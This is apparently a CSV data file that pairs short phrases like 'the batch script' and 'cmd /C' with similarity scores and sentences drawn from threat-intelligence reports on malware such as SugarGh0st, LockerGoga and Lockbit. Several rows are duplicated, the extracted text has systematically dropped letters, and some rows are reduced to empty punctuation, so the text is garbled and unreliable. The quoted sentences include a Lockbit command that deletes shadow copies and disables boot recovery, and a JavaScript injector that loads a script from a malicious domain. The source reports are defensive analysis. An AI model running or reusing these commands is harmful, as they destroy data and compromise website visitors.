hash,phrase,similarity,adjacent_sentences
d62a6e941ec0167b0f3e15c72eb634ba,the configuration file encrypted.,0.8266329492308891,"['When loaded in svchost.exe that was started with -k netsvc parameter, it starts its main thread.', 'The module creates ShelHWStop, Global\\ShelHWDetectionEvent events, mutex ShelHWDetectionMutex.', '12 The main thread exits if the folowing proceses were found at its start: LMon.exe sagui.exe RDTask.exe kpf4gui.exe ALsvc.exe pxagent.exe fsma32.exe licwiz.exe SavService.exe prevxcsi.exe alertwal.exe livehelp.exe SAVAdminService.exe csi-eui.exe mpf.exe lokout.exe savprogres.exe lpfw.exe mpfcm.exe emlproui.exe savmain.exe outpost.exe fameh32.exe emlproxy.exe savcleanup.exe filemon.exe AntiHok.exe endtaskpro.exe savcli.exe procmon.exe xfilter.exe netguardlite.exe backgroundscanclient.exe Snifer.exe scfservice.exe oasclnt.exe sdcservice.exe acs.exe scfmanager.exe omnitray.exe sdcdevconx.exe aupdrun.exe spywareterminatorshield.exe onlinent.exe sdcdevconIA.exe spfw.exe spywat~1.exe opf.exe sdcdevcon.exe spfirewalsvc.exe supdate.exe pctavsvc.exe configuresav.exe fwsrv.exe terminet.exe pctav.exe alupdate.exe opfsvc.exe tscutynt.exe pcviper.exe InstLsp.exe uwcdsvr.exe umxtray.exe persfw.exe CMain.exe dfw.exe updclient.exe pgacount.exe CavAUD.exe ipatrol.exe webwal.exe privatefirewal3.exe CavEmSrv.exe pciprev.exe winroute.exe protect.exe Cavmr.exe prifw.exe apvxdwin.exe rt_crc_service.exe Cavl.exe tzpfw.exe as3pf.exe schedulerdaemon.exe CavAp.exe privatefirewal3.exe avas.exe sdtrayap.exe CavCons.exe pft.exe avcom.exe siteadv.exe CavMud.exe armorwal.exe avkproxy.exe sndsrvc.exe CavUMAS.exe ap_firewal.exe avkservice.exe snsmcon.exe Upd.exe blackd.exe avktray.exe snsupd.exe cavasm.exe blackice.exe avkwctrl.exe procguard.exe CavSub.exe umxagent.exe avmgma.exe DCSUserProt.exe CavUserUpd.exe kpf4s.exe avtask.exe avkwctl.exe CavQ.exe tpfdmn.exe aws.exe firewal.exe Cavoar.exe blinksvc.exe bgctl.exe THGuard.exe CEmRep.exe sp_rser.exe bgnt.exe spybotsd.exe OnAcesInstaler.exe op_mon.exe botsafe.exe xauth_service.exe SoftAct.exe cmdagent.exe bulguard.exe xfilter.exe CavSn.exe VCATCH.EXE cdas2.exe zlh.exe Packetizer.exe SpyHunter3.exe cmgrdian.exe adoronsfirewal.exe Packetyzer.exe washer.exe configmgr.exe scfservice.exe zanda.exe authfw.exe cpd.exe scfmanager.exe zerospywarele.exe dvpapi.exe espwatch.exe dltray.exe 13 zerospywarelite_instaler.exe clamd.exe fgui.exe dlservice.exe Wireshark.exe sab_wab.exe filedeleter.exe ashwebsv.exe tshark.exe SUPERAntiSpyware.exe firewal.exe ashdisp.exe rawshark.exe vdtask.exe firewal204.exe ashmaisv.exe Ethereal.exe asr.exe firewalgui.exe ashserv.exe Tethereal.exe NetguardLite.exe gateway.exe aswupdsv.exe Windump.exe nstzerospywarelite.exe hpf_.exe avastui.exe Tcpdump.exe cdinstx.exe iface.exe avastsvc.exe Netcap.exe cdas17.exe invent.exe Netmon.exe fsrt.exe ipcserver.exe CV.exe VSDesktop.exe ipctray.exe The module reads the registry value SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Reliability TimeStampForUI.', 'It is an encrypted configuration file.', 'The configuration file contains the list of aditional modules, their names, DL exports names to cal and location of the modules aditional files.', 'Gaus ShelNotifyUser ShelNotifyUserEx SetWindowEvent InitShelEx %systemrot%\\system32\\winshel.ocx %temp%\\ws1bin.dat Godel InitCache RevertCache ValidateEntry CreateEntry %windir%\\system32\\dskapi.ocx %temp%\\~gdl.tmp UsbDir InitCache RevertCache ValidateEntry CreateEntry %windir%\\system32\\smdk.ocx %temp%\\~mdk.tmp String values from config file (example) 14 Every module is loaded and its export functions are caled as specified in the configuration.', 'Most of the actions are loged in an encrypted (with XOR) file %temp%\\~shw.tmp.']"
39e29af445d8deae622f11c7366518a7,The batch script,0.8423512966646981,"['JavaScript droper The JavaScript droper is a heavily obfuscated script embeded with base64 encoded data of the other components of the atack.', 'The JavaScript decodes and drops the embeded files into the %TEMP% folder, including a batch script, a customized DL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundl32 executable from the Windows\\SysWow64 folder into the %TEMP% folder.', 'Finaly, it executes the batch script loader from the %TEMP% location and runs the customized DL loader.', 'The JavaScript deleted itself from the file system afterward.', '5/16 The JavaScript droper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the comands to run the droped customized DL loader.']"
eca348ac2e9d0da5334464f9c73d2754,The batch script,0.8423512966646981,"['JavaScript droper The JavaScript droper is a heavily obfuscated script embeded with base64 encoded data of the other components of the atack.', 'The JavaScript decodes and drops the embeded files into the %TEMP% folder, including a batch script, a customized DL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundl32 executable from the Windows\\SysWow64 folder into the %TEMP% folder.', 'Finaly, it executes the batch script loader from the %TEMP% location and runs the customized DL loader.', 'The JavaScript deleted itself from the file system afterward.', 'htps:/blog.talosinteligence.com/new-sugargh0st-rat/ 6/19 1/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea The JavaScript droper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the comands to run the droped customized DL loader.']"
d3d11f0faf194266cc86ec9f1af4162d,with batch scripts,0.7586541997864189,"['The presence of FIN6 in an enginering company with no conection to payment card information semed od.', 'The Mandiant investigation revealed that the atacker was in the early stages of a deploying LockerGoga.', 'Using domain administrator credentials, the atacker ran batch files containing psexec comands to conect to remote systems and deploy LockerGoga.', 'The batch scripts (Fig.', '1) executed LockerGoga as the service mstdc, which was likely the atackers atempt to masquerade as the legitimate Windows service msdtc.', 'The batch files used by Figure 1. the atacker folowed the naming convention xa.bat, xab.bat, xac.bat and Strings from so on.', 'deployment BAT files.']"
399c17d5f44d8b855c9751aae73f3c11,Uses GetComputerName to query the computer name.,0.7718691072807002,"[']205:808/owa/?path=/calendar&wa=e89wNPykFLPfHbYB7EZQBa3r5iNVI1xVTGsRd NyDpGe63-4pAmE9ZLjU8ImCUKG8L_JvKk9yN2MsD78LpRmOazvojXhUow8zQoBVqn-kV-HC-VqmI_2 BTCqlQHjOBpyMBJyQ3SmBin6xfNZsUkH7_H_Sa79SEA74gG0PGzk8"" Example 5 A file (MD5: 4e43c0ca1febc1c7107a8eb5325b9) that was found during an incident investigation uses HTPS to interact with its C2.', 'Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Comand and Control TA01 | Aplication Layer Protocol: Web Protocols T1071.01 Contents 267 Comand name Comand description ls Get a list of objects in the specified directory.', 'execute Run an arbitrary file or comand.', ""getcomputername Get the computer's name."", 'Download a file to an infected system and save it with the specified name.', 'Information about the download result is forwarded to the server at miror-exchange[.', ']com/upload/ upload with the system ID (GET parameter ""id""), file name and eror code (GET parameter ""file"") specified.']"
eedc908904741699e76852465550c3cd,brute-force activity,0.9010114864093721,"['The login and pasword can be compromised through This type of malware delivery can result several methods: in rival snifer families being hacked.', 'For stealers, i.e.', 'programs that extract instance, during one wave of infections, paswords saved in browsers; the operators of the WebRank snifer gained aces to the MagentoName malware for intercepting entered data JS snifer code and aded their malicious (including logins and paswords); code to it.', 'brute force.', 'Another example is the atack on Fedify, a real-time push notification service.', 'Hacking of third-party services By injecting the JS snifer code into A snifer can infiltrate a website through the code of a given file, the threat hacked third-party services, whose actor automaticaly uploaded the scripts work on the target website: JS snifer to al Fedify customers, Hacking websites that provide and their sites were infected with the services for online stores (customer fedbackembad-min-1.0.js script.', 'The suport chats or analytics and snifer was injected into the Fedify statistics systems).']"
8d2f7e9f01ec7f234b9e60df5ad44fec,brute-force activity,0.9010114864093721,"['The login and pasword can be compromised through This type of malware delivery can result several methods: in rival snifer families being hacked.', 'For stealers, i.e.', 'programs that extract instance, during one wave of infections, paswords saved in browsers; the operators of the WebRank snifer gained aces to the MagentoName malware for intercepting entered data JS snifer code and aded their malicious (including logins and paswords); code to it.', 'brute force.', 'Another example is the atack on Fedify, a real-time push notification service.', 'Hacking of third-party services By injecting the JS snifer code into A snifer can infiltrate a website through the code of a given file, the threat hacked third-party services, whose actor automaticaly uploaded the scripts work on the target website: JS snifer to al Fedify customers, Hacking websites that provide and their sites were infected with the services for online stores (customer fedbackembad-min-1.0.js script.', 'The suport chats or analytics and snifer was injected into the Fedify statistics systems).']"
3d2e99ba94188b71a17364073a49e3ea,the batch file,0.7514180536353627,"['The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecomunications.', '4.', 'Sandman (China) - Sandman APT is likely asociated with suspected China-based threat clusters known to use the KEYPLUG backdor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-086/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's tolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing colective eforts to track threat actors engaged in the Israel-Hamas war.']"
3d2e99ba94188b71a17364073a49e3ea,The batch file,0.7514180536353627,"['The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecomunications.', '4.', 'Sandman (China) - Sandman APT is likely asociated with suspected China-based threat clusters known to use the KEYPLUG backdor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-086/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's tolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing colective eforts to track threat actors engaged in the Israel-Hamas war.']"
39e29af445d8deae622f11c7366518a7,The batch script,0.8423512966646981,"['JavaScript droper The JavaScript droper is a heavily obfuscated script embeded with base64 encoded data of the other components of the atack.', 'The JavaScript decodes and drops the embeded files into the %TEMP% folder, including a batch script, a customized DL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundl32 executable from the Windows\\SysWow64 folder into the %TEMP% folder.', 'Finaly, it executes the batch script loader from the %TEMP% location and runs the customized DL loader.', 'The JavaScript deleted itself from the file system afterward.', '5/16 The JavaScript droper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the comands to run the droped customized DL loader.']"
eca348ac2e9d0da5334464f9c73d2754,The batch script,0.8423512966646981,"['JavaScript droper The JavaScript droper is a heavily obfuscated script embeded with base64 encoded data of the other components of the atack.', 'The JavaScript decodes and drops the embeded files into the %TEMP% folder, including a batch script, a customized DL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundl32 executable from the Windows\\SysWow64 folder into the %TEMP% folder.', 'Finaly, it executes the batch script loader from the %TEMP% location and runs the customized DL loader.', 'The JavaScript deleted itself from the file system afterward.', 'htps:/blog.talosinteligence.com/new-sugargh0st-rat/ 6/19 1/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea The JavaScript droper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the comands to run the droped customized DL loader.']"
31347d89b18461f35448b26fefb00133,cmd /C,0.8135172745614935,"['USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.']"
d5019121cbc645eb0787efab173a12b3,cmd /C,1.0,"['Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .']"
6676698d65e372feb79c0159d9d2b11e,cmd /C,0.8135172745614935,"[', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").']"
31347d89b18461f35448b26fefb00133,cmd /c,0.8135172745614935,"['USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.']"
d5019121cbc645eb0787efab173a12b3,cmd /c,1.0,"['Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .']"
6676698d65e372feb79c0159d9d2b11e,cmd /c,0.8135172745614935,"[', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").']"
18c26951bd00fb6e41199b99210fa0f8,ARP table,0.7929878754892529,"['Inhibiting System Recovery (T1490) Acording to a CISA flash report on Lockbit 2.0 malware published in February 202, threat actors executed the folowing Windows Comand Shel script to damage the built-in recovery [17]: cmd.exe ""C:\\Windows\\System32\\cmd.exe"" /c vsadmin delete shadows /al /quiet & wmic shadowcopy delete & bcdedit /set {default} botstatuspolicy ignorealfailures & bcdedit /set {default} recoveryenabled no In this code, adversaries leveraged the vsadmin and wmic utilities to quietly delete al shadow copies on the compromised system, supresing any confirmation prompts or output.', 'Folowing this, atackers used the bcdedit utility to modify the bot configuration data on the system, which is believed to be done to ignore al bot erors and continue boting.', 'Note that the recoveryenabled option is suplied to the bcdedit to disable recovery options for the default bot entry.', '3.', 'Discovering Domain Acounts (T1087.02) Another CISA report in February 202 reveals that MudyWater leveraged the folowing comand to enumerate domain users [18]: cmd.exe net user/domain 25 #1.4.', 'T1059.04 Unix Shel The Unix shel is a comand-line interface that alows users to interact with Unix-like operating systems.', 'It includes several diferent shels, such as the Bourne Shel (sh), Bourne-Again Shel (bash), Z Shel (zsh), Korn Shel (ksh), and Secure Shel (SH), which are comonly used.']"
18c26951bd00fb6e41199b99210fa0f8,ARP table,0.7949311938792307,"['For instance, acording to a malware analysis report performed by Palo Alto, analyzing threat samples from April 202 to June 202, among al of the web threats detected during the research, JavaScript downloaders and redirectors were in the top 5 most leveraged web threats, infecting around 30 diferent domains [31].', 'Analysis shows that atackers often inject malicious JavaScript downloaders to a webpage owned by them, creating several new script elements that redirect website visitors to ads, spams, or any other malicious domains such as train[.]developfirstline[.', ']com: .', '.', '.', 'Element.prototype.apendAfter = function(element) { element.parentNode.insertBefore(this, element.nextSibling) ), false(function () { var elem = document.createElement(\'script"") elem.type = \'text / javascript\' elem.sc = \'htps:/train.developfirstline.com/delivery.js?s=3\' elem.apendAfter(document.getElementsByTagName(\'script\')(0]) elem.apendAfter(document.getElementsByTagName(""\'head\')[0]) document.getElementsByTagName(\'head\')(01.apendChild(elem) .', '.']"
